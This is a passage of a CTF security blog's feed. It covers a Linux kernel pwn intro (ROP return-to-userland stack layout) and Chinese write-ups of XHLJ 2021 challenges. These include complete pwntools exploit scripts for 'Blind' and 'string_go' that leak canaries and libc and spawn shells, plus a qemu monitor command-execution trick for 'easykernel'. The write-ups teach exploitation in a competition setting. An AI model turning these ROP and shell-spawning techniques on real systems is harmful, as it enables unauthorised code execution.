class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">SYM_CODE_START_LOCAL(common_interrupt_return)</span><br><span class="line">SYM_INNER_LABEL(swapgs_restore_regs_and_return_to_usermode, SYM_L_GLOBAL)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_ENTRY</span></span><br><span class="line"><span class="comment">/* Assert that pt_regs indicates user mode. */</span></span><br><span class="line">testb$<span class="number">3</span>, CS(%rsp)</span><br><span class="line">jnz<span class="number">1f</span></span><br><span class="line">ud2</span><br><span class="line"><span class="number">1</span>:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">POP_REGS pop_rdi=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The stack is now user RDI, orig_ax, RIP, CS, EFLAGS, RSP, SS.</span></span><br><span class="line"><span class="comment"> * Save old stack pointer and switch to trampoline stack.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">movq%rsp, %rdi</span><br><span class="line">movqPER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp</span><br><span class="line">UNWIND_HINT_EMPTY</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Copy the IRET frame to the trampoline stack. */</span></span><br><span class="line">pushq<span class="number">6</span>*<span class="number">8</span>(%rdi)<span class="comment">/* SS */</span></span><br><span class="line">pushq<span class="number">5</span>*<span class="number">8</span>(%rdi)<span class="comment">/* RSP */</span></span><br><span class="line">pushq<span class="number">4</span>*<span class="number">8</span>(%rdi)<span class="comment">/* EFLAGS */</span></span><br><span class="line">pushq<span class="number">3</span>*<span class="number">8</span>(%rdi)<span class="comment">/* CS */</span>        &lt;--- save the above <span class="keyword">register</span> <span class="keyword">and</span> recover</span><br><span class="line">pushq<span class="number">2</span>*<span class="number">8</span>(%rdi)<span class="comment">/* RIP */</span>       &lt;--- spawn our root shell here</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Push user RDI on the trampoline stack. */</span></span><br><span class="line">pushq(%rdi)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We are on the trampoline stack.  All regs except RDI are live.</span></span><br><span class="line"><span class="comment"> * We can do future final exit work right here.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">STACKLEAK_ERASE_NOCLOBBER</span><br><span class="line"></span><br><span class="line">SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Restore RDI. */</span></span><br><span class="line">popq%rdi</span><br><span class="line">SWAPGS</span><br><span class="line">INTERRUPT_RETURN    &lt;--- iretq</span><br></pre></td></tr></table></figure><p>So the layout of the stack should be</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">+--------------------------------+</span><br><span class="line">| commit new cred to our process |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| addr of swapgs_ret             |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| addr of iretq                 |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| previous rip(spawn root shell) |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| previous cs                    |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| previous eflags                |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| previous rsp                   |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| previous ss                    |</span><br><span class="line">+--------------------------------+</span><br></pre></td></tr></table></figure><p>ROPGadget will fail to find <code>iretq</code> sometimes, we can use the following command to find the gadget.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">objdump -j .text -d ./vmlinux | grep iretq | head -1</span><br><span class="line">ffffffff81050ef2: 48 cf                iretq</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>After returning to userland, you will get a root shell.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;An Intro to Linux Kernel Pwn in CTF&lt;/h1&gt;
&lt;h2 id=&quot;Intro&quot;&gt;Intro&lt;/h2&gt;
&lt;p&gt;In this post we will have a brief view about Linux kernel pwn, wha</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://kpwnz.github.io/tags/PWN/"/>
    
    <category term="Linux" scheme="https://kpwnz.github.io/tags/Linux/"/>
    
    <category term="kernel" scheme="https://kpwnz.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>西湖论剑2021 PWN</title>
    <link href="https://kpwnz.github.io/2021/11/22/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912021-PWN/"/>
    <id>https://kpwnz.github.io/2021/11/22/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912021-PWN/</id>
    <published>2021-11-23T01:55:33.000Z</published>
    <updated>2021-12-02T13:12:30.068Z</updated>
    
    <content type="html"><![CDATA[<h1>XHLJ 2021 PWN</h1><h2 id="Blind">Blind</h2><p>分析的时候完全想岔了，往dl resolve的方向做了结果完全做不出来（）</p><p>考虑<code>alarm()</code>，有一个特点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/32i alarm</span><br><span class="line">=&gt; 0x7ffff7eb5d90 &lt;alarm&gt;:mov    eax,0x25</span><br><span class="line">   0x7ffff7eb5d95 &lt;alarm+5&gt;:syscall </span><br><span class="line">   0x7ffff7eb5d97 &lt;alarm+7&gt;:cmp    rax,0xfffffffffffff001</span><br></pre></td></tr></table></figure><p>第二条指令就是<code>syscall</code>，所以我们可以爆破最后一个字节，有256种可能，成功即可直接用<code>GOT</code>表跳转到<code>syscall</code>，然后，又可以利用<code>read()</code>的返回值是写入的字节数来控制<code>rax</code>寄存器，这样就能实现任意<code>syscall</code>了，剩下的内容都很容易，给的栈溢出空间很多，很容易构造 ROP Chain</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./blind&#x27;</span>)</span><br><span class="line"><span class="comment"># sh = remote(&#x27;82.157.6.165&#x27;, 59900)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./blind&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x00000000004007c1</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004007c3</span></span><br><span class="line">call_read = <span class="number">0x40074C</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15 = <span class="number">0x4007BA</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x50</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;bss_addr: &#x27;</span> + <span class="built_in">hex</span>(elf.bss()))</span><br><span class="line">log.info(<span class="string">&#x27;alarm got: &#x27;</span> + <span class="built_in">hex</span>(elf.got[<span class="string">&#x27;alarm&#x27;</span>]))</span><br><span class="line">log.info(<span class="string">&#x27;alarm plt: &#x27;</span> + <span class="built_in">hex</span>(elf.plt[<span class="string">&#x27;alarm&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*offset</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rsi_r15_ret)</span><br><span class="line">payload += p64(elf.bss()+<span class="number">0x100</span>)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)              <span class="comment"># read /bin/sh</span></span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rsi_r15_ret)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;alarm&#x27;</span>])        <span class="comment"># alarm -&gt; syscall</span></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)  </span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rsi_r15_ret)</span><br><span class="line">payload += p64(elf.bss()+<span class="number">0x150</span>)         <span class="comment"># read 0x3b</span></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rbx_rbp_r12_r13_r14_r15) <span class="comment"># ret2init</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;alarm&#x27;</span>])            <span class="comment"># call alarm()</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(elf.bss()+<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x4007A0</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(elf.bss()+<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;alarm&#x27;</span>])</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sh.send(<span class="string">b&#x27;\xFF&#x27;</span>)    <span class="comment"># brute force</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sh.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3b</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">b&#x27;uname -a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="easykernel">easykernel</h2><p>不知道是有意的还是疏忽，<code>start.sh</code>里没有重定向<code>monitor</code>…也就是说直接ctrl A C就能进入qemu monitor，然后直接挂载<code>rootfs.img</code>读flag就完事了（）用<code>migrate exec</code>基本什么操作都可以做了，需要重定向一下输出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(qemu) migrate &quot;exec:ls -al 1&gt;&amp;2&quot;</span><br><span class="line">total 12168</span><br><span class="line">drwx------ 2 kali kali    4096 Nov 23 11:25 .</span><br></pre></td></tr></table></figure><h2 id="string-go">string_go</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">lative_func</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">bool</span> v1; <span class="comment">// al</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *v4; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">void</span> *v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+1Ch] [rbp-A4h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+20h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+40h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [rsp+60h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [rsp+80h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+A8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">basic_string</span>(&amp;v9);</span><br><span class="line">  std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">basic_string</span>(&amp;v10);</span><br><span class="line">  std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">basic_string</span>(&amp;v11);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;&gt;&gt;&gt; &quot;</span>);</span><br><span class="line">  std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;v7);</span><br><span class="line">  <span class="built_in">split</span>((__int64)&amp;v8, (__int64)&amp;v10);</span><br><span class="line">  v1 = !std::vector&lt;std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;,std::allocator&lt;std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;&gt;&gt;::<span class="built_in">size</span>(&amp;v8)</span><br><span class="line">    &amp;&amp; v7 &lt;= <span class="number">7</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;&gt;&gt;&gt; &quot;</span>);</span><br><span class="line">    std::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;std::cin, &amp;v10);</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;&gt;&gt;&gt; &quot;</span>);</span><br><span class="line">    v2 = std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>[](&amp;v10, v7);</span><br><span class="line">    std::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;std::cin, v2);</span><br><span class="line">  &#125;</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;std::cout, &amp;v10);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;&gt;&gt;&gt; &quot;</span>);</span><br><span class="line">  std::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;std::cin, &amp;v9);</span><br><span class="line">  v3 = std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">size</span>(&amp;v9, &amp;v9);</span><br><span class="line">  v4 = (<span class="keyword">const</span> <span class="keyword">void</span> *)std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">c_str</span>(&amp;v9);</span><br><span class="line">  v5 = (<span class="keyword">void</span> *)std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">c_str</span>(&amp;v11);</span><br><span class="line">  <span class="built_in">memcpy</span>(v5, v4, v3);</span><br><span class="line">  std::vector&lt;std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;,std::allocator&lt;std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;&gt;&gt;::~<span class="built_in">vector</span>(&amp;v8);</span><br><span class="line">  std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~<span class="built_in">basic_string</span>(&amp;v11);</span><br><span class="line">  std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~<span class="built_in">basic_string</span>(&amp;v10);</span><br><span class="line">  std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~<span class="built_in">basic_string</span>(&amp;v9);</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v2 = std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>[](&amp;v10, v7);</span><br></pre></td></tr></table></figure><p>中的<code>v7</code>是可以被控制的，对于一个小字符串，<code>std::string</code>会把内容也存在栈上，如果<code>v7</code>是负数，就可以修改掉<code>std::string</code>结构体的<code>size</code>，在后面<code>std::cout</code>的时候泄漏出栈上的内容，可以得到<code>canary</code>，同时，也可以得到返回<code>__libc_start_main</code>的地址，这就可以泄漏出libc的基址了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">std::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;std::cin, &amp;v9);</span><br><span class="line">n_bytes = std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">size</span>(&amp;v9, &amp;v9);</span><br><span class="line">v4 = (<span class="keyword">const</span> <span class="keyword">void</span> *)std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">c_str</span>(&amp;v9);</span><br><span class="line">v5 = (<span class="keyword">void</span> *)std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">c_str</span>(&amp;v11);</span><br><span class="line"><span class="built_in">memcpy</span>(v5, v4, n_bytes);</span><br></pre></td></tr></table></figure><p>最后这部分中的<code>n_bytes</code>,<code>v4</code>都可以控制，<code>v5</code>在栈上，通过后面的<code>memcpy</code>完成ROP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;string_go&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#input()</span></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1+1+1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    r = sh.recv(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">r = sh.recv(<span class="number">8</span>)</span><br><span class="line">canary = u64(r.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;canary: &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">sh.recv(<span class="number">3</span>*<span class="number">0x8</span>)</span><br><span class="line">ret = sh.recv(<span class="number">8</span>)</span><br><span class="line">ret = u64(ret.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;ret: &#x27;</span> + <span class="built_in">hex</span>(ret))</span><br><span class="line">pie = ret - <span class="number">0x254D</span></span><br><span class="line">log.success(<span class="string">&#x27;pie: &#x27;</span> + <span class="built_in">hex</span>(pie))</span><br><span class="line">sh.recv(<span class="number">19</span>*<span class="number">0x8</span>)</span><br><span class="line">ret_addr_libc = sh.recv(<span class="number">8</span>)</span><br><span class="line">ret_addr_libc = u64(ret_addr_libc.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;ret_addr_libc: &#x27;</span> + <span class="built_in">hex</span>(ret_addr_libc))</span><br><span class="line">libc_base = ret_addr_libc - <span class="number">0x1e4a</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shaddr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">systemaddr = libc.symbols[<span class="string">&#x27;system&#x27;</span>] + libc_base</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;sh: &#x27;</span> + <span class="built_in">hex</span>(shaddr))</span><br><span class="line">log.info(<span class="string">&#x27;system: &#x27;</span> + <span class="built_in">hex</span>(systemaddr))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(canary) * <span class="number">7</span></span><br><span class="line">payload += p64(pie+<span class="number">0x3cf3</span>)</span><br><span class="line">payload += p64(shaddr) </span><br><span class="line">payload += p64(systemaddr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;XHLJ 2021 PWN&lt;/h1&gt;
&lt;h2 id=&quot;Blind&quot;&gt;Blind&lt;/h2&gt;
&lt;p&gt;分析的时候完全想岔了，往dl resolve的方向做了结果完全做不出来（）&lt;/p&gt;
&lt;p&gt;考虑&lt;code&gt;alarm()&lt;/code&gt;，有一个特点&lt;/p&gt;
&lt;figure cl</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://kpwnz.github.io/tags/PWN/"/>
    
    <category term="CTF" scheme="https://kpwnz.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-2370</title>
    <link href="https://kpwnz.github.io/2021/11/03/CVE-2017-2370/"/>
    <id>https://kpwnz.github.io/2021/11/03/CVE-2017-2370/</id>
